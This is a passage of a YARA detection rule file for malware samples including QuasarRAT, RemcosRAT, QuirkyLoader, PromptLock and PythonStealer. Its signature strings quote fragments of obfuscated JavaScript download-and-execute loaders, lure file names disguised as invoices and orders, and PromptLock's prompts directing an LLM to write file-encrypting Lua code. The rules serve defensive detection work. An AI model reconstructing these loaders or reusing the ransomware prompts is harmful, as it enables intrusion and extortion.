      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2a45e65d67e3e6a40c91115a5a9d0ab482f88b206735e1391a351d376d0934f2"
   strings:
      $x1 = "(function(_0x4bcc5d,_0x4840ff){var _0x16e9ad=_0x1ae1,_0x2cd0ba=_0x4bcc5d();while(!![]){try{var _0x19d8c2=-parseInt(_0x16e9ad(0xe" ascii /* score: '36.00'*/
      $s2 = "4aae1[_0x3502e5(0x10f)+'xt'],_0x1fa591=_0x4f02a4['mnmpt'](sysBase64Decode,_0x5a47a0),_0x5ce004=getExecutor(),_0x3726bd=_0x4f02a4" ascii /* score: '23.00'*/
      $s3 = "-0x1bc3,_0x5e0d01[_0x286a65(0x11b)](_0x5cf6a1,-0x22*0xe5+-0x2*0x2d7+0x247c)));}function getExecutor(){var _0x2bb7c0=['Fu','nc','" ascii /* score: '21.00'*/
      $s4 = "x102)](),_0x5ae36d;}function logSystemActivity(){var _0x286a65=_0x1ae1,_0x5e0d01={'THdJV':_0x286a65(0x11d),'hstSL':_0x286a65(0xf" ascii /* score: '12.00'*/
      $s5 = "0x3a485f){return _0x27c592(_0x3a485f);}};_0x4f02a4[_0x3502e5(0x114)](logSystemActivity);var _0x144fef=[_0x4f02a4[_0x3502e5(0x137" ascii /* score: '12.00'*/
      $s6 = "3|2|0','ReadText','GET','46f2f853da','utf-8','wvVBW','hzGlN','j398','gdUTu','#-up','roba','da#','/i#e','BBQKb','chive.o','Close'" ascii /* score: '12.00'*/
      $s7 = " Date()[_0x286a65(0x103)](),_0xaa255f[_0x286a65(0xed)]);WScript[_0x286a65(0x126)](_0x5e0d01[_0x286a65(0x122)](-0x377+0x212e+0x1*" ascii /* score: '10.00'*/
      $s8 = "[_0x3502e5(0xf9)](_0x5ce004,_0x1fa591);_0x3726bd();break;}}}runUpdateService();" fullword ascii /* score: '10.00'*/
      $s9 = ",'getSeconds','VgsxX','ent','est','Type','5908285sAsmpx','6DlXJsY','us.ar','split','Status','rQdxW','iDJZI','ResponseTe','join'," ascii /* score: '9.00'*/
      $s10 = "x3502e5(0x118)],'x#'][_0x3502e5(0x110)]('')[_0x3502e5(0xe8)](/#/g,'t'),_0x20494e=_0x4f02a4[_0x3502e5(0x11a)](getNetworkData,_0x1" ascii /* score: '9.00'*/
      $s11 = "ti','on'],_0x40ffb1=_0x2bb7c0['join']('');return this[_0x40ffb1];}function getNetworkData(_0x51978d){var _0x327e56=_0x1ae1,_0x4f" ascii /* score: '9.00'*/
      $s12 = ",_0x4f02a4['wVCPy'],_0x4f02a4[_0x3502e5(0x134)],_0x4f02a4['bxdQu'],_0x4f02a4['nECZR'],'8'][_0x3502e5(0x110)](''),_0xf4aae1=getNe" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule QuasarRAT_signature__3e107245 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_3e107245.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3e10724585ae86c92b7504014a540d3a97003c7120151db479445b0bc25b01d3"
   strings:
      $x1 = "(function(_0x13f9c7,_0x5f0e64){var _0x1e437f=_0xcf13,_0xbb9ff7=_0x13f9c7();while(!![]){try{var _0x25e18=-parseInt(_0x1e437f(0x16" ascii /* score: '36.00'*/
      $s2 = "2)](getExecutor),_0x45ea6d=_0x5ccb99[_0x4457a1(0x128)](_0x1d5214,_0x6aa9e5);_0x45ea6d();break;}}}runUpdateService();" fullword ascii /* score: '24.00'*/
      $s3 = "342360ExPCAw','ResponseTe'];_0x74aa=function(){return _0x4dbafc;};return _0x74aa();}function getExecutor(){var _0x5c232b=_0xcf13" ascii /* score: '17.00'*/
      $s4 = "SXML2.DOM','CjbOq','8|4|6|7|12','rjzHe','/5f10','join','nodeTypedV','gwnJk','#-up','WinH','byACP','chive.o','3120016HZwPFE','GET" ascii /* score: '15.00'*/
      $s5 = "e;}break;}}function logSystemActivity(){var _0x1e1868=_0xcf13,_0x84641={'rVhDP':_0x1e1868(0x158),'YextT':function(_0x4cd608,_0x3" ascii /* score: '12.00'*/
      $s6 = "n(_0x593eec,_0x3201a1){return _0x593eec(_0x3201a1);}};_0x5ccb99[_0x4457a1(0x152)](logSystemActivity);var _0x75a748=[_0x5ccb99[_0" ascii /* score: '12.00'*/
      $s7 = "_0x3a307e(0x168),_0xb4545a,![]);continue;}break;}}function runUpdateService(){var _0x4457a1=_0xcf13,_0x5ccb99={'qcJIh':function(" ascii /* score: '10.00'*/
      $s8 = ",_0x3830ab=['Fu','nc','ti','on'],_0xbabb6e=_0x3830ab[_0x5c232b(0x160)]('');return this[_0xbabb6e];}function getNetworkData(_0xb4" ascii /* score: '9.00'*/
      $s9 = "0x1e1b7c=_0x5ccb99[_0x4457a1(0x173)](getNetworkData,_0xe29cfe);if(_0x5ccb99[_0x4457a1(0x136)](_0x1e1b7c['Status'],0x1de1+-0x231+" ascii /* score: '9.00'*/
      $s10 = "#','gbiuw','rVhDP','pQajD','Charset','2615165LKhlvE','BnAPR','Type','jgier','fTpoi','dataType','us.ar','9e7bb3','nrkxx','|9|1|13" ascii /* score: '9.00'*/
      $s11 = "50),'BnAPR':'/i#e','fTpoi':'ms/ac','IKtYv':_0x4457a1(0x156),'APDCb':_0x4457a1(0x13b),'AgEkb':_0x4457a1(0x127),'gyBQt':_0x4457a1(" ascii /* score: '9.00'*/
      $s12 = ",'Send','geri','er.co','ouZwY','m/ac','Open','getSeconds','257332zebwRe','h##','AgEkb','6pDBJhi','gyBQt','htt','463642ZrzAfg','1" ascii /* score: '9.00'*/
      $s13 = "x5ccb99[_0x4457a1(0x14e)],'x#'][_0x4457a1(0x160)]('')[_0x4457a1(0x154)](/#/g,'t'),_0x5d9b0c=_0x5ccb99[_0x4457a1(0x135)](getNetwo" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule QuasarRAT_signature__75d5e6bb {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_75d5e6bb.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "75d5e6bba3672f8e14509ae1c3eccf41986f40feb749279a79d3d791920bf2aa"
   strings:
      $x1 = "(function(_0x2861c1,_0x473401){var _0x714eb9=_0x210d,_0x5c2474=_0x2861c1();while(!![]){try{var _0x777f5=parseInt(_0x714eb9(0x11e" ascii /* score: '36.00'*/
      $s2 = "a2c0[_0x2aea60];return _0x1ece2d;},_0x210d(_0x25b1c9,_0x519776);}function getExecutor(){var _0x189f04=_0x210d,_0x15b18c=['Fu','n" ascii /* score: '21.00'*/
      $s3 = "ecode,_0x4fb286),_0x3d91d8=getExecutor(),_0x4ae57d=_0x3d91d8(_0x533bfb);_0x4e8730[_0x355039(0x130)](_0x4ae57d);break;}}}runUpdat" ascii /* score: '21.00'*/
      $s4 = "x162)](new Date()['getSeconds'](),_0x73f38c[_0x4e4aa9(0x125)]);WScript['Sleep'](_0x3a87e5[_0x4e4aa9(0x147)](-0x1079*-0x1+0x3e4+-" ascii /* score: '15.00'*/
      $s5 = "4e8730['XdFox'](logSystemActivity);var _0x1afedd=[_0x4e8730[_0x355039(0x13e)],_0x4e8730[_0x355039(0x15f)],'ia60',_0x4e8730['LvJW" ascii /* score: '12.00'*/
      $s6 = "}}function logSystemActivity(){var _0x4e4aa9=_0x210d,_0x3a87e5={'zLGap':_0x4e4aa9(0x116),'VuTex':_0x4e4aa9(0x132),'tuxlS':_0x4e4" ascii /* score: '12.00'*/
      $s7 = "GADme','Charset','jgier','h##','LQqcu','chive.o','est','473576TXCghc','1|7|2|9|3|','96735aEbPwi','MSXML2.DOM','join','GET','1968" ascii /* score: '12.00'*/
      $s8 = "[]);continue;}break;}}function runUpdateService(){var _0x355039=_0x210d,_0x4e8730={'XdFox':function(_0xee096d){return _0xee096d(" ascii /* score: '10.00'*/
      $s9 = "c','ti','on'],_0x1c6e86=_0x15b18c[_0x189f04(0x156)]('');return this[_0x1c6e86];}function getNetworkData(_0x4eb201){var _0x520622" ascii /* score: '9.00'*/
      $s10 = "0x355039(0x118)],'8'][_0x355039(0x156)](''),_0x44a7df=_0x4e8730[_0x355039(0x115)](getNetworkData,_0x35f71c);if(_0x44a7df[_0x3550" ascii /* score: '9.00'*/
      $s11 = "')[_0x355039(0x136)](/#/g,'t'),_0x31ad0a=getNetworkData(_0x1afedd)['ResponseTe'+'xt']['split']('\\x0d\\x0a');for(var _0x5a79e2=0" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 20KB and
      1 of ($x*) and all of them
}

rule QuasarRAT_signature__de5ddf29 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_de5ddf29.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "de5ddf293b2218028988593a61ac8d5faf11605dc0f616c9a2e4858c127f8775"
   strings:
      $x1 = "(function(_0x5327db,_0x5edab0){var _0xa3bed0=_0x56b5,_0x239993=_0x5327db();while(!![]){try{var _0x2d9efb=parseInt(_0xa3bed0(0x17" ascii /* score: '36.00'*/
      $s2 = "0x2*0x607+0x190b+-0xc99*0x1));}function getExecutor(){var _0x36e029=['Fu','nc','ti','on'],_0x5be72f=_0x36e029['join']('');return" ascii /* score: '21.00'*/
      $s3 = "0x24054c(0x149)](getExecutor),_0x288f8a=_0x27f6dd['MKyYB'](_0x26157b,_0x2dc27d);_0x27f6dd[_0x24054c(0x152)](_0x288f8a);break;}}}" ascii /* score: '21.00'*/
      $s4 = "7){return _0x21a6a8(_0x417987);}};_0x27f6dd[_0x24054c(0x152)](logSystemActivity);var _0x3a8f57=[_0x27f6dd[_0x24054c(0x162)],_0x2" ascii /* score: '12.00'*/
      $s5 = "122)]=-0x173c*-0x1+-0x7ed*0x1+-0x1*0xf4f;continue;}break;}}function logSystemActivity(){var _0x386a8d=_0x56b5,_0x3e11ad={'OHErg'" ascii /* score: '12.00'*/
      $s6 = "x386a8d(0x164)](),_0x5bc685['length']);WScript[_0x386a8d(0x165)](-0x2266+0x1*0x243a+0x20+_0x3e11ad[_0x386a8d(0x14b)](_0x5bf517,-" ascii /* score: '10.00'*/
      $s7 = "runUpdateService();function _0x6828(){var _0x48ec98=['OHErg','aRjVD','ps://','/i#e','qRDGV','da#','er.co','Document.6','9e7bb3'," ascii /* score: '10.00'*/
      $s8 = "52ef;},_0x56b5(_0x34153f,_0x5f1235);}function runUpdateService(){var _0x24054c=_0x56b5,_0x27f6dd={'zLMTD':function(_0x5ba2ad){re" ascii /* score: '10.00'*/
      $s9 = ",'ia60','ms/ac','WSNxi','geri','bin.base64','|9|13|8|5|','SpQya','HlXuG','df4dea819','gBSGU','tBOPK','MSXML2.DOM','4|11','ent','" ascii /* score: '10.00'*/
      $s10 = "27f6dd[_0x24054c(0x172)],'x#'][_0x24054c(0x150)]('')[_0x24054c(0x124)](/#/g,'t'),_0x1c42f6=getNetworkData(_0x3a8f57)[_0x24054c(0" ascii /* score: '9.00'*/
      $s11 = "createElem','Close','/5f10','456376vkxJKC','akeGD','2712690TARaBK','krwGC','7WblFVK','zaGGn','htt','length','jBBQn','Write','get" ascii /* score: '9.00'*/
      $s12 = "7f6dd[_0x24054c(0x129)](getNetworkData,_0x5f3008);if(_0x27f6dd['RtFwH'](_0x3fbe49[_0x24054c(0x154)],0x173c*0x1+-0x665*0x1+-0x100" ascii /* score: '9.00'*/
      $s13 = " this[_0x5be72f];}function getNetworkData(_0x46281b){var _0x2dd1d6=_0x56b5,_0x410ceb={'aRjVD':'0|4|2|3|1','HvJrA':_0x2dd1d6(0x16" ascii /* score: '9.00'*/
      $s14 = ",'lzLnR','pRequ','WinH','12407mWKvcQ','15279610LcwSOk','Send','GET','#-up','aHSBV','Position','text','replace'];_0x6828=function" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule QuasarRAT_signature__e5823906 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_e5823906.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e582390605a848286e4340ad14f4b075abeefdfe11e747f3e879967f7fad744a"
   strings:
      $x1 = "(function(_0x5349a6,_0x495453){var _0xd7561f=_0x37c1,_0x54c79d=_0x5349a6();while(!![]){try{var _0xa7945c=-parseInt(_0xd7561f(0x2" ascii /* score: '36.00'*/
      $s2 = "[_0x4d5279[_0xe4c28f(0x211)]][_0x4d5279[_0xe4c28f(0x1f8)]](0x6eb1+-0x1e1a+-0x132a);}function getExecutor(){var _0x20f33a=_0x37c1" ascii /* score: '21.00'*/
      $s3 = "e(_0x10c17d),_0x12a98b=_0x2f3656[_0x34ca88(0x217)](getExecutor),_0x257203=_0x12a98b(_0x58a489);_0x257203();break;}}}runUpdateSer" ascii /* score: '17.00'*/
      $s4 = "539*-0x3;continue;}break;}}function logSystemActivity(){var _0xe4c28f=_0x37c1,_0x4d5279={'kgeHt':'WScript','OSaeB':'Sleep'};this" ascii /* score: '15.00'*/
      $s5 = "_0x3a4c8b==_0x54475f;},'FEfxI':function(_0x3e6330){return _0x3e6330();}};logSystemActivity();var _0x409dd8=[_0x2f3656['goQkF'],_" ascii /* score: '12.00'*/
      $s6 = "':'est','AIcth':'GET'},_0x27f733=_0x56c875(0x1f5)[_0x56c875(0x208)]('|'),_0x45fc5=0x3*-0xa99+0x8e9*0x2+0x31*0x49;while(!![]){swi" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 20KB and
      1 of ($x*) and all of them
}

rule QuasarRAT_signature__4 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "121b9bee6d537d8bacb2541bf121316a31a41d98538e78b4bf6bea9f4572a0c6"
   strings:
      $s1 = "Rem3.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 200KB and
      all of them
}

rule QuasarRAT_signature__55013ae3 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_55013ae3.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "55013ae32094df6ae2007895a2da3f1a626579a6f782ffd50108649e3bc802f1"
   strings:
      $s1 = "comer.bat" fullword ascii /* score: '21.00'*/
      $s2 = "comer.batPK" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 60KB and
      all of them
}

rule QuasarRAT_signature__588313d0 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_588313d0.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "588313d02d07de091fe0ed92e3a700bdad4f51da6e68be03196a3231ee2eba69"
   strings:
      $s1 = "function N(G,i){var a=y();return N=function(J,V){J=J-0xa8;var j=a[J];if(N['GHPRbD']===undefined){var D=function(n){var X='abcdef" ascii /* score: '21.00'*/
      $s2 = "RVdPIJcTG','W6WTqCkO','WRXexeCYz2XNlbdcJSoC','l8o9oxu','i8oizSoD','gSoix8oD','hmkrDZ0','dmo9bNu','ChK1W4q','WOjIWOVdNW','WRHFW4B" ascii /* score: '12.00'*/
      $s3 = "++){e+='%'+('00'+O['charCodeAt'](f)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(e);};var l=function(n,X){var O=" ascii /* score: '9.00'*/
      $s4 = "'WRxdPSkloG','W6NcN8obrq','tmoOwCkS','l8kGWQfz','W6LFWR7cOa','bSo5aCkR','pfmLWRy','CCkIha0','WQLJgfa','b8kfW5CN','m8krW7eF','W6q" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 70KB and
      all of them
}

rule QuasarRAT_signature__5ca08e15 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_5ca08e15.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5ca08e15da8921ea58d50aa7e9541bd510fa2993ba8387e45f4eaaf4e8c055a7"
   strings:
      $s1 = "Bluffedes.bat" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 100KB and
      all of them
}

rule QuirkyLoader_signature_ {
   meta:
      description = "_subset_batch - file QuirkyLoader(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c2582680364f899212faeed853cca1395ef3688e2eab81872c0c36ae75a54773"
   strings:
      $s1 = "updserc/SbieDll.dll" fullword ascii /* score: '20.00'*/
      $s2 = "updserc/micorsercisecxbit21r2.exe" fullword ascii /* score: '19.00'*/
      $s3 = "jDpW.Rkn" fullword ascii /* score: '10.00'*/
      $s4 = "NuL - SLf" fullword ascii /* score: '9.00'*/
      $s5 = "wfvvggw" fullword ascii /* score: '8.00'*/
      $s6 = "lefj+:* " fullword ascii /* score: '8.00'*/
      $s7 = "gdddfdedg" fullword ascii /* score: '8.00'*/
      $s8 = "fwzvghv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 10000KB and
      all of them
}

rule RemcosRAT_signature__4 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).r01"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b1f3463b315c793237aeaed1b8cbeef60aabe31366749d9979ff7501c0476e1"
   strings:
      $s1 = "AWB Ref 5321985 PDF.exe" fullword ascii /* score: '16.00'*/
      $s2 = "?kFtpp83W" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule RemcosRAT_signature__28fa6716 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_28fa6716.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "28fa6716fa82f2fe163ed89e26d8d50fb974adad403891a0ff2a2d43e75761ae"
   strings:
      $s1 = "Execute decryptedContent" fullword ascii /* score: '23.00'*/
      $s2 = "2B2B484D4153415A2B2B" ascii /* score: '17.00'*/ /* hex encoded string '++HMASAZ++' */
      $s3 = "23234A4552522323" ascii /* score: '17.00'*/ /* hex encoded string '##JERR##' */
      $s4 = "7E7E495250454C7E7E" ascii /* score: '17.00'*/ /* hex encoded string '~~IRPEL~~' */
      $s5 = "23235A4642514E462323" ascii /* score: '17.00'*/ /* hex encoded string '##ZFBQNF##' */
      $s6 = "2323474B4549532323" ascii /* score: '17.00'*/ /* hex encoded string '##GKEIS##' */
      $s7 = "3D3D454248594E583D3D" ascii /* score: '17.00'*/ /* hex encoded string '==EBHYNX==' */
      $s8 = "7E7E43474E4855467E7E" ascii /* score: '17.00'*/ /* hex encoded string '~~CGNHUF~~' */
      $s9 = "2B2B52495558432B2B" ascii /* score: '17.00'*/ /* hex encoded string '++RIUXC++' */
      $s10 = "3D3D485A5749423D3D" ascii /* score: '17.00'*/ /* hex encoded string '==HZWIB==' */
      $s11 = "2323554C4B53512323" ascii /* score: '17.00'*/ /* hex encoded string '##ULKSQ##' */
      $s12 = "232352525643412323" ascii /* score: '17.00'*/ /* hex encoded string '##RRVCA##' */
      $s13 = "2B2B4E5151462B2B" ascii /* score: '17.00'*/ /* hex encoded string '++NQQF++' */
      $s14 = "2B2B474B4A4F50552B2B" ascii /* score: '17.00'*/ /* hex encoded string '++GKJOPU++' */
      $s15 = "23234E4E4D5A56422323" ascii /* score: '17.00'*/ /* hex encoded string '##NNMZVB##' */
   condition:
      uint16(0) == 0x0a0d and filesize < 600KB and
      8 of them
}

rule RemcosRAT_signature__5 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c60760f6bb53855f5842455ee4b7d27436470f136e07334793e3f3532e213bef"
   strings:
      $s1 = " <script>if(window.location.hash.length > 0) window.location.href = window.location.origin + '/' + window.location.hash.replace(" ascii /* score: '13.00'*/
      $s2 = " <script>if(window.location.hash.length > 0) window.location.href = window.location.origin + '/' + window.location.hash.replace(" ascii /* score: '13.00'*/
      $s3 = "\"#\",\"\");</script><pre style=\"color:red\">could not parse url !</pre>" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x3c20 and filesize < 1KB and
      all of them
}

rule RemcosRAT_signature__6 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).lzh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "282e5bcb7e447b35752d79e4a255efdf7839d185ef8b071cc92ad28a88451fc4"
   strings:
      $s1 = "REQUEST-ORDER-7399 -7676.exeK" fullword ascii /* score: '12.00'*/
      $s2 = "eUUUUU" fullword ascii /* reversed goodware string 'UUUUUe' */ /* score: '11.00'*/
      $s3 = "IX* -_" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5e32 and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__7 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ffec6638a87befb22b2bd999024bc8f7533e82a5e5b8a865643eb901b084589a"
   strings:
      $s1 = " RE RFQ Resend Doc2805079915 .exe" fullword ascii /* score: '19.00'*/
      $s2 = " RE RFQ Resend Doc2805079915 .txt" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 70KB and
      all of them
}

rule RemcosRAT_signature__8 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "58725cfc90b74f5d6154b2bbb40b7c17bbe8c2ac9c4c0fa0debd6711fa0a86b1"
   strings:
      $s1 = "!Purchase Order 4500564358_pdf.exe" fullword ascii /* score: '19.00'*/
      $s2 = "4500564358" ascii /* score: '17.00'*/ /* hex encoded string 'EVCX' */
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__9 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e28a61d951116cfeaf4ba6a3d5efcfe2e76f78b1eb995101ef762c702fa0b104"
   strings:
      $s1 = "payment.bat" fullword ascii /* score: '18.00'*/
      $s2 = "payment.batPK" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _PromptLock_signature__PromptLock_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__0 {
   meta:
      description = "_subset_batch - from files PromptLock(signature).elf, PromptLock(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2755e1ec1e4c3c0cd94ebe43bd66391f05282b6020b2177ee3b939fdd33216f6"
      hash2 = "1458b6dc98a878f237bfb3c3f354ea6e12d76e340cefe55d6a1c9c7eb64c9aee"
   strings:
      $x1 = "x509: a root or intermediate certificate is not authorized to sign for this name: refusing to use HTTP_PROXY value in CGI enviro" ascii /* score: '50.00'*/
      $x2 = "parse errorinvalid ')'avx512vnniwavx512vbmi2ClassHESIODauthoritiesadditionalsContent-Typesession_key=payloads.txttlsunsafeekmclo" ascii /* score: '36.00'*/
      $x3 = "If Execution passed: %shttp2: server sent GOAWAY and closed the connection; LastStreamID=%v, ErrCode=%v, debug=%qThe log shows v" ascii /* score: '34.50'*/
      $x4 = "- Print each FULL file pathYou are a Lua code validator. Check if the code runs properly on the basis of the log. Respond with <" ascii /* score: '33.00'*/
      $x5 = "If Execution passed: %shttp2: server sent GOAWAY and closed the connection; LastStreamID=%v, ErrCode=%v, debug=%qThe log shows v" ascii /* score: '32.50'*/
      $x6 = "socks bindProcessingNo Content%s|%s%s|%srsa1024minimpossible" fullword ascii /* score: '32.00'*/
      $x7 = "On a company server - files which contain server or company operational data might be most vulnerable to encryption, as they wou" ascii /* score: '31.00'*/
      $x8 = "The code should encrypt all files listed in \"target_file_list.log\", overwrite the original file with encrypted contents." fullword ascii /* score: '31.00'*/
      $x9 = "github.com/yuin/gopher-lua.osExecute" fullword ascii /* score: '31.00'*/
      $x10 = "reflectlite.Value.Interfacereflectlite.Value.NumMethodinvalid P224 point encodinginvalid P256 point encodinginvalid P384 point e" ascii /* score: '31.00'*/
      $s11 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s12 = "bitscrypto/cipher: invalid buffer overlap of output and additional datasysinfo, payloads.txt, target_file_info.log, target_file_" ascii /* score: '30.00'*/
      $s13 = "os/exec.ExitError.Sys" fullword ascii /* score: '30.00'*/
      $s14 = "On a company server - files which contain server or company operational data might be most vulnerable to encryption, as they wou" ascii /* score: '30.00'*/
      $s15 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 30000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__074e6f0b_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_1 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash2 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash3 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash4 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash5 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash6 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash7 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
   strings:
      $x1 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '31.00'*/
      $s2 = "error processing extended key usage extension" fullword wide /* score: '25.00'*/
      $s3 = "Private key passed - public key expected." fullword wide /* score: '24.00'*/
      $s4 = "Public key passed - private key expected" fullword wide /* score: '24.00'*/
      $s5 = "attempt to process message to long for cipher" fullword wide /* score: '24.00'*/
      $s6 = "Key length invalid. Key needs to be 32 byte - 256 bit!!!" fullword wide /* score: '24.00'*/
      $s7 = "PublicKeyEncryptedSession" fullword ascii /* score: '23.00'*/
      $s8 = "unable to process key - " fullword wide /* score: '23.00'*/
      $s9 = "PKCS12 key store MAC invalid - wrong password or corrupted file." fullword wide /* score: '23.00'*/
      $s10 = "Validation already attempted for round 1 payload for " fullword wide /* score: '23.00'*/
      $s11 = "Validation already attempted for round 2 payload for " fullword wide /* score: '23.00'*/
      $s12 = "Validation already attempted for round 3 payload for " fullword wide /* score: '23.00'*/
      $s13 = "get_AuthEncryptedContentInfo" fullword ascii /* score: '22.00'*/
      $s14 = "get_KeyEncryptionAlgOid" fullword ascii /* score: '22.00'*/
      $s15 = "GetAuthEncryptedContentInfo" fullword ascii /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _PythonStealer_signature__351592d5ead6df0859b0cc0056827c95_imphash__PythonStealer_signature__dcaf48c1f10b0efa0a4472200f3850e_2 {
   meta:
      description = "_subset_batch - from files PythonStealer(signature)_351592d5ead6df0859b0cc0056827c95(imphash).exe, PythonStealer(signature)_dcaf48c1f10b0efa0a4472200f3850ed(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a10c2422b7ec344de6eec8b54655429bb16fbb0967e74efde06af301361dca77"
      hash2 = "93489af56be776607a6ee407a0f60bd5107da8321e313ad200c8fde51076dfd9"
   strings:
      $x1 = "bapi-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $x2 = "bapi-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x3 = "bapi-ms-win-core-processthreads-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x4 = "bapi-ms-win-core-processenvironment-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $s5 = "bapi-ms-win-core-libraryloader-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s6 = "bapi-ms-win-core-namedpipe-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s7 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s8 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
